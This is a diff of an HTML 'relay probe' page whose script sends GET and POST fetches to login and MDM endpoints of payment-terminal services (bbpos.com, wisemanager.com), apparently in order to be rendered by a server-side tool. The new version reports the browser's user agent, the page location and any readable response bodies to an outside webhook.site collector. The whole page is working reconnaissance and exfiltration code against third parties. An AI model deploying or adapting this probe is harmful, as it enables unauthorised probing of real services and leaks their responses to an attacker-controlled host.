@@ -1,31 +1,36 @@
-<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe-init</title></head>
-<body><h1 id="h">w1nd3x relay probe</h1><pre id="out">starting</pre>
+<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe2</title></head>
+<body><h1>w1nd3x relay probe v2</h1><pre id="out">starting</pre>
 <script>
-const T = [
-  ["GET","https://developer.bbpos.com/login"],
-  ["POST","https://developer.bbpos.com/login"],
-  ["GET","https://tms.bbpos.com/login"],
-  ["POST","https://portal.wisemanager.com/mdm/pingBackend"],
-  ["GET","https://example.com/"]
-];
+const WH="https://webhook.site/e874bd7b-28ef-4011-b7fd-f73a0eb59565";
+const RUN=Math.random().toString(36).slice(2,8);
 const log=[];
-function dump(){document.getElementById('out').textContent=JSON.stringify(log);document.title='w1nd3x-'+log.length;}
+function rep(tag,data){ log.push([tag,data]);
+  try{ fetch(WH+"?run="+RUN+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(JSON.stringify(data).slice(0,1200)),{mode:'no-cors'}); }catch(e){}
+  document.getElementById('out').textContent=JSON.stringify(log).slice(0,4000);
+}
+const T=[["GET","https://developer.bbpos.com/login"],["POST","https://developer.bbpos.com/login"],
+["GET","https://tms.bbpos.com/login"],["POST","https://tms.bbpos.com/login"],
+["GET","https://portal.wisemanager.com/mdm/getLoginUrl"],["POST","https://portal.wisemanager.com/mdm/pingBackend"],
+["GET","https://bms.bbpos.com/"],["GET","https://example.com/"]];
 (async()=>{
+ rep("hello",{ua:navigator.userAgent,href:location.href,ts:Date.now()});
  for(const [m,u] of T){
-   const q=u+(u.includes('?')?'&':'?')+'w1nd3xq='+Math.random().toString(36).slice(2);
-   // opaque no-cors (request IS sent; shows up in Lighthouse network-requests)
-   try{ await fetch(q,{method:m,mode:'no-cors',credentials:'omit',
-        headers:m==='POST'?{'Content-Type':'application/x-www-form-urlencoded'}:{},
-        body:m==='POST'?'w1nd3x=1':undefined}); log.push([m,u,'nocors-sent']);}
-   catch(e){ log.push([m,u,'nocors-err',String(e).slice(0,80)]); }
-   // cors attempt (readable only if target allows)
-   try{ const r=await fetch(q,{method:m,mode:'cors',credentials:'omit',
-        headers:m==='POST'?{'Content-Type':'application/x-www-form-urlencoded'}:{},
-        body:m==='POST'?'w1nd3x=1':undefined});
-        const t=await r.text(); log.push([m,u,'CORS-OK',r.status,t.length,t.slice(0,200)]);}
-   catch(e){ log.push([m,u,'cors-blocked',String(e).slice(0,60)]); }
-   dump();
+  const q=u+(u.includes('?')?'&':'?')+"w1nd3x="+RUN;
+  let t0=performance.now();
+  try{ const r=await fetch(q,{method:m,mode:'no-cors',credentials:'omit',
+       headers:m==='POST'?{'Content-Type':'application/x-www-form-urlencoded'}:{},
+       body:m==='POST'?'w1nd3x=1':undefined});
+   rep("nocors",{m:m,u:u,type:r.type,status:r.status,ms:Math.round(performance.now()-t0)});
+  }catch(e){ rep("nocors-fail",{m:m,u:u,err:String(e).slice(0,100),ms:Math.round(performance.now()-t0)}); }
+  t0=performance.now();
+  try{ const r=await fetch(q,{method:m,mode:'cors',credentials:'omit',
+       headers:m==='POST'?{'Content-Type':'application/x-www-form-urlencoded'}:{},
+       body:m==='POST'?'w1nd3x=1':undefined});
+   const b=await r.text();
+   rep("CORS-READ",{m:m,u:u,status:r.status,len:b.length,head:b.slice(0,250)});
+  }catch(e){ rep("cors-blocked",{m:m,u:u,err:String(e).slice(0,80)}); }
  }
- dump();
+ rep("done",{n:log.length});
+ await new Promise(r=>setTimeout(r,2500));
 })();
 </script></body></html>
